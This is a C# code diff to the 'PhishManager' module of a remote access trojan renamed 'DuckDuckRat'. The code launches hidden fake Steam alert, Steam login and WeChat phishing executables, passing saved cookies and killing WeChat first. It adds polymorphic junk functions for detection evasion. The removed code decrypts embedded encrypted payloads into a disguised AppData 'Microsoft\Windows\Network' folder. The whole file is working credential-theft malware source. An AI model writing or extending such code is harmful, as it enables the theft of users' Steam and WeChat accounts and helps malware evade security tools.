@@ -1,67 +1,22 @@
 using System;
 using System.IO;
 using System.Reflection;
-using VanguardCore;
+using DuckDuckRat;
 using System.Diagnostics;
 using System.Threading.Tasks;
 using System.Threading;
 
-namespace FinalBot.Modules
+namespace DuckDuckRat.Modules
 {
     public static class PhishManager
     {
         // [POLY_JUNK]
-        private static void _vanguard_e233e047() {
+        private static void _DuckDuckRat_e233e047() {
             int val = 24189;
             if (val > 50000) Console.WriteLine("Hash:" + 24189);
         }
 
-        private static string GetTempDir()
-        {
-            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-            string path = Path.Combine(appData, "Microsoft", "Windows", "Network");
-            if (!Directory.Exists(path)) Directory.CreateDirectory(path);
-            return path;
-        }
-
-        private static string ExtractResource(string resourceName, string outFileName)
-        {
-            try
-            {
-                AesHelper.WipeKeys();
-                string outPath = Path.Combine(GetTempDir(), outFileName);
-
-                if (File.Exists(outPath))
-                {
-                    try { File.Delete(outPath); } catch { return outPath; }
-                }
-
-                var assembly = Assembly.GetExecutingAssembly();
-                using (Stream? stream = assembly.GetManifestResourceStream($"FinalBot.{resourceName}"))
-                {
-                    if (stream == null) return "";
-
-                    if (resourceName.EndsWith(".bin"))
-                    {
-                        using (MemoryStream ms = new MemoryStream())
-                        {
-                            stream.CopyTo(ms);
-                            byte[]? decrypted = AesHelper.Decrypt(ms.ToArray());
-                            if (decrypted != null) File.WriteAllBytes(outPath, decrypted);
-                        }
-                    }
-                    else
-                    {
-                        using (FileStream fileStream = new FileStream(outPath, FileMode.Create, FileAccess.Write))
-                        {
-                            stream.CopyTo(fileStream);
-                        }
-                    }
-                }
-                return outPath;
-            }
-            catch { return ""; }
-        }
+        private static string GetTempDir() => ResourceModule.WorkDir;
 
         private static CancellationTokenSource? _lockdownCts;
         public static bool GlobalBlockSteam { get; set; } = false;
@@ -130,13 +85,13 @@ namespace FinalBot.Modules
         public static void LaunchSteamAlert()
         {
             PrepareSteamFiles(_savedAgentName, _savedCookies, _savedVacLang);
-            string exePath = ExtractResource("SteamAlert.bin", "SteamAlert.exe");
-            if (!string.IsNullOrEmpty(exePath) && File.Exists(exePath))
+            string exePath = ResourceModule.GetToolPath("SteamAlert");
+            if (File.Exists(exePath))
             {
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = exePath,
-                    Arguments = $"--pipe vanguard_status_pipe --lang {_savedVacLang}",
+                    Arguments = $"--pipe DuckDuckRatv1_status_pipe --lang {_savedVacLang}",
                     UseShellExecute = false,
                     CreateNoWindow = true,
                     WorkingDirectory = GetTempDir()
@@ -177,13 +132,13 @@ namespace FinalBot.Modules
         public static void LaunchSteamLogin(string lang = "en")
         {
             PrepareSteamFiles(_savedAgentName, _savedCookies, lang);
-            string exePath = ExtractResource("SteamLogin.bin", "SteamLogin.exe");
-            if (!string.IsNullOrEmpty(exePath) && File.Exists(exePath))
+            string exePath = ResourceModule.GetToolPath("SteamLogin");
+            if (File.Exists(exePath))
             {
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = exePath,
-                    Arguments = $"--pipe vanguard_status_pipe --lang {lang}",
+                    Arguments = $"--pipe DuckDuckRatv1_status_pipe --lang {lang}",
                     UseShellExecute = false,
                     CreateNoWindow = true,
                     WorkingDirectory = GetTempDir()
@@ -195,8 +150,8 @@ namespace FinalBot.Modules
         public static void LaunchWeChatPhish()
         {
             KillWeChat();
-            string exePath = ExtractResource("WeChatPhish.bin", "WeChatPhish.exe");
-            if (!string.IsNullOrEmpty(exePath) && File.Exists(exePath))
+            string exePath = ResourceModule.GetToolPath("WeChatPhish");
+            if (File.Exists(exePath))
             {
                 Process.Start(new ProcessStartInfo
                 {
@@ -230,3 +185,5 @@ namespace FinalBot.Modules
         }
     }
 }
+
+
